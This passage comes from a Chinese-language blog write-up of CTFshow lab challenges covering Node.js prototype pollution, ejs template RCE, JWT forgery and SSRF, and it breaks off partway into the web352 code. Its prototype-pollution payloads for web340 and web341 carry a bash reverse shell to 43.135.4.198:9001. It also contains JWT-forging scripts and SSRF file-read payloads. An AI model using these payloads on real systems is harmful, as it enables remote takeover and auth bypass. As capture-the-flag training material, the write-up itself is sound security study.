<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userinfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isVIP</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAuthor</span> = <span class="hljs-literal">false</span>;     <br>    &#125;;<br>  &#125;<br>  utils.<span class="hljs-title function_">copy</span>(user.<span class="hljs-property">userinfo</span>,req.<span class="hljs-property">body</span>);<br>  <span class="hljs-keyword">if</span>(user.<span class="hljs-property">userinfo</span>.<span class="hljs-property">isAdmin</span>)&#123;<br>   res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>&#125;);  <br>  &#125;<br>  <br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>这里比较特殊，需要污染两级：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.135.4.198/9001 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>简单验证一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userinfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isVIP</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAuthor</span> = <span class="hljs-literal">false</span>;<br>    &#125;;<br>&#125;<br>&gt;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">__proto__</span>) <span class="hljs-comment">//结果：&#123;&#125;</span><br>&gt;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>) <span class="hljs-comment">//结果：[Object: null prototype] &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>user的实例对象是由一个匿名构造函数创建的，user.__proto__指向的是这个构造函数的原型对象，而这个构造函数的默认原型对象是一个空对象，空对象的原型对象的原型就是Object.prototype。</p><h3 id="CTFshow-nodejs-web341"><a href="#CTFshow-nodejs-web341" class="headerlink" title="[CTFshow nodejs]web341"></a>[CTFshow nodejs]web341</h3><p>和340的区别就是没了<code>api.js</code>文件。</p><p><a href="">参考资料</a>，ejs RCE。简单说就是通过原型链污染实现变量覆盖从而RCE。</p><p>[参考资料](<a href="https://www.anquanke.com/post/id/236354#h2-2">关于nodejs的ejs和jade模板引擎的原型链污染挖掘-安全客 - 安全资讯平台 (anquanke.com)</a>)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userinfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isVIP</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">false</span>;    <br>    &#125;;<br>  &#125;;<br>  utils.<span class="hljs-title function_">copy</span>(user.<span class="hljs-property">userinfo</span>,req.<span class="hljs-property">body</span>);<span class="hljs-comment">//copy可以看成merge()，这里存在原型链污染</span><br>  <span class="hljs-keyword">if</span>(user.<span class="hljs-property">userinfo</span>.<span class="hljs-property">isAdmin</span>)&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;login success!&#x27;</span>&#125;);  <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;login fail!&#x27;</span>&#125;);  <br>  &#125;<br><br>&#125;);<br><span class="hljs-comment">//app.js存在：</span><br>app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>).<span class="hljs-property">__express</span>); <br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-comment">//ejs 的 renderFile 进入：</span><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">renderFile</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>...<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">tryHandleCache</span>(opts, data, cb);<br>&#125;;<br></code></pre></td></tr></table></figure><p>跟进 tryHandleCache 函数, 发现一定会进入 handleCache 函数，handleCache中的complie 函数存在渲染拼接：</p><p><img src="/img/ctfshowweb341.png" alt="ctfshowweb341"></p><p>所以不管前面给没给这个<code>outputFunctionName</code>赋值，通过原型链污染进行变量覆盖把它弄成恶意代码就成(注意语句前后的拼接，污染两级)。</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule..constructor._load(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.135.4.198/9001 0&gt;&amp;1\&quot;&#x27;</span>);<span class="hljs-comment">//&quot;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>[GYCTF2020]Ez_Express是和这题一样的考点。</p><h3 id="CTFshow-nodejs-web344"><a href="#CTFshow-nodejs-web344" class="headerlink" title="[CTFshow nodejs]web344"></a>[CTFshow nodejs]web344</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">url</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/8c|2c|\,/ig</span>))&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag :)&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> query = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">query</span>);<br>  <span class="hljs-keyword">if</span>(query.<span class="hljs-property">name</span>===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="hljs-property">password</span>===<span class="hljs-string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="hljs-property">isVIP</span>===<span class="hljs-literal">true</span>)&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag. :)&#x27;</span>);<br>  &#125;<br><br>&#125;);<br></code></pre></td></tr></table></figure><p><code>JSON.parse(req.query.query)</code>用来解析HTTP请求的查询参数。比如对于：<code>http://example.com/?name=John&amp;age=30</code>，<code>req.query</code> 将会是 <code>&#123; name: &#39;John&#39;, age: &#39;30&#39; &#125;</code>。<code>req.query.query</code>意思是解析请求中名为 <code>query</code> 的查询参数的值。</p><p>所以直接:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?q</span>uery=&#123;<span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;ctfshow&quot;</span></span>,<span class="hljs-string">&quot;isVIP&quot;</span><span class="hljs-symbol">:true</span>&#125;<br></code></pre></td></tr></table></figure><p>但注意题目中过滤了<code>2c</code>和<code>,</code>(%2c对应url编码中的,)。所以要利用一下nodejs的特性：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?q</span>uery=&#123;<span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span>&amp;query=<span class="hljs-string">&quot;password&quot;</span></span><span class="hljs-symbol">:<span class="hljs-string">&quot;%63tfshow&quot;</span>&amp;query=<span class="hljs-string">&quot;isVIP&quot;</span></span><span class="hljs-symbol">:true</span>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>node.js处理req.query.query的时候，它不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析，因此这样分开来传就可以绕过逗号了。注意c要进行url编码成%63,（因为会和前面的%22(双引号的URL编码)组成%22c)。</p></blockquote><h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><p>ctfshow上主要的题型就是原型链污染&#x2F;原型链污染然后RCE。原型链污染的话个人理解就是通过利用原型继承机制修改对象原型捣鼓出某些本来不应该存在的值(利用__proto__及类似merge&#x2F;clone函数)。有些题可能会把__proto__过滤掉，这时可以利用<code>constructor.prototype</code>绕过对 <code>__proto__</code> 的过滤。</p><p>还有就是nodejs这东西也存在类似php之类的问题:存在弱类型和使用数组绕过hash加密。</p><h3 id="CTFshow-jwt-web345"><a href="#CTFshow-jwt-web345" class="headerlink" title="[CTFshow jwt]web345"></a>[CTFshow jwt]web345</h3><p>一些JWT的前置知识：<a href="https://mayi077.gitee.io/2020/05/19/JSON-Web-Token%EF%BC%88JWT%EF%BC%89%E5%8E%9F%E7%90%86%E5%8F%8A%E7%94%A8%E6%B3%95/">参考资料</a></p><p>抓包发现JWT只有两部分，而且算法为none：</p><p><img src="/img/ctfshowweb3451.png" alt="ctfshowweb3451"></p><p>那就不用管第三部分了，第一部分保留第二部分把<code>sub</code>字段改成<code>admin</code>后即可。</p><p>(不知道为啥出不来flag，看网上其它师傅也有这个问题。把第一部分删掉才出flag。)</p><h3 id="CTFshow-jwt-web346"><a href="#CTFshow-jwt-web346" class="headerlink" title="[CTFshow jwt]web346"></a>[CTFshow jwt]web346</h3><p>这次的jwt存在三部分：</p><p><img src="/img/ctfshowweb3461.png" alt="ctfshowweb3461"></p><p>利用空加密算法进行攻击<a href="https://xz.aliyun.com/t/6776?time__1311=n4+xnD0DRDyDgDIoEDlhAeK+xxBDjxAKoXtx&alichlgref=https://www.google.com/">参考资料</a></p><p>删掉signature字段，然后修改<code>alg</code>为none,sub字段为admin即可。</p><p>两个要注意的点：</p><blockquote><p>结尾的.别省略。</p><p>Base64中有<code>+</code>、 <code>/</code>、 <code>=</code> 三个字符，在base64URL中，<code>=</code> 会被省略掉、<code>+</code> 会被替换为 <code>-</code> 、<code>/</code> 替换为 <code>_</code>。</p></blockquote><p>找个base64网站手动改也行，脚本改也行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>header = &#123;<br>    <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>    <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br>payload=&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1707386440</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1707393640</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1707386440</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;13de6961b596e827865157eb5b80d411&quot;</span><br>&#125;<br><br><br>token = jwt.encode(<br>    payload=payload,<br>    key=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment"># 密钥</span><br>    algorithm=<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-comment"># 加密方式</span><br>    headers=header<br>)<br><br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><h3 id="CTFshow-jwt-web347"><a href="#CTFshow-jwt-web347" class="headerlink" title="[CTFshow jwt]web347"></a>[CTFshow jwt]web347</h3><p>jwt-cracker爆破：</p><p>123456</p><p>得到密钥直接在jwt.io上修改就行。</p><h3 id="CTFshow-jwt-web348"><a href="#CTFshow-jwt-web348" class="headerlink" title="[CTFshow jwt]web348"></a>[CTFshow jwt]web348</h3><p>同上。</p><h3 id="CTFshow-jwt-web349"><a href="#CTFshow-jwt-web349" class="headerlink" title="[CTFshow jwt]web349"></a>[CTFshow jwt]web349</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//public//private.key&#x27;</span>);<br>  <span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)&#123;<br><span class="hljs-keyword">var</span> flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-keyword">var</span> auth = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">auth</span>;<br><span class="hljs-keyword">var</span> cert = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//public/public.key&#x27;</span>);  <span class="hljs-comment">// get public key</span><br>jwt.<span class="hljs-title function_">verify</span>(auth, cert, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, decoded</span>) &#123;<br>  <span class="hljs-keyword">if</span>(decoded.<span class="hljs-property">user</span>===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;you are not admin&#x27;</span>);<br>  &#125;<br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>私钥加密然后公钥解密，然后公钥私钥全给了：所以只要拿到私钥后自己加密一下就行。算法的话是<code>RS256</code></p><blockquote><p>RS256 (采用SHA-256 的 RSA  签名) 是一种非对称算法, 它使用公共&#x2F;私钥对: 标识提供方采用私钥生成签名, JWT 的使用方获取公钥以验证签名。由于公钥 (与私钥相比)  不需要保护, 因此大多数标识提供方使其易于使用方获取和使用 (通常通过一个元数据URL)。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>payload=&#123;<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="hljs-string">&#x27;RS256&#x27;</span>))<br><span class="hljs-comment"># python2运行</span><br></code></pre></td></tr></table></figure><h3 id="CTFshow-jwt-web350"><a href="#CTFshow-jwt-web350" class="headerlink" title="[CTFshow jwt]web350"></a>[CTFshow jwt]web350</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//routes/private.key&#x27;</span>);<br>  <span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><br>  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;auth&#x27;</span>,token);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;where is flag?&#x27;</span>);<br>  <br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)&#123;<br><span class="hljs-keyword">var</span> flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br>res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-keyword">var</span> auth = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">auth</span>;<br><span class="hljs-keyword">var</span> cert = fs.<span class="hljs-title function_">readFileSync</span>(process.<span class="hljs-title function_">cwd</span>()+<span class="hljs-string">&#x27;//routes/public.key&#x27;</span>);  <span class="hljs-comment">// get public key</span><br>jwt.<span class="hljs-title function_">verify</span>(auth, cert,<span class="hljs-keyword">function</span>(<span class="hljs-params">err, decoded</span>) &#123;<br>  <span class="hljs-keyword">if</span>(decoded.<span class="hljs-property">user</span>===<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;you are not admin&#x27;</span>+err);<br>  &#125;<br>&#125;);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>这次私钥我们拿不到了，只能下载公钥。这时可以考虑修改非对称加密算法(RS256)为对称加密算法(HS256)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure><h3 id="小总结：-1"><a href="#小总结：-1" class="headerlink" title="小总结："></a>小总结：</h3><p>这玩意儿三部分组成：<code>header</code>.<code>payload</code>.<code>signature</code>。每部分利用<code>Base64URL</code>编码之后再<code>.</code>连接。解题思路的话就是通过修改加密算法(比如改成none，但注意改完了<code>signature</code>前面那个小数点别忘加)或者拿到公钥&#x2F;私钥后进行伪造。</p><h3 id="CTFshow-SSRF-web351"><a href="#CTFshow-SSRF-web351" class="headerlink" title="[CTFshow SSRF]web351"></a>[CTFshow SSRF]web351</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><blockquote><p>url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>或者<br>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p></blockquote><h3 id="CTFshow-SSRF-web352"><a href="#CTFshow-SSRF-web352" class="headerlink" title="[CTFshow SSRF]web352"></a>[CTFshow SSRF]web352</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span 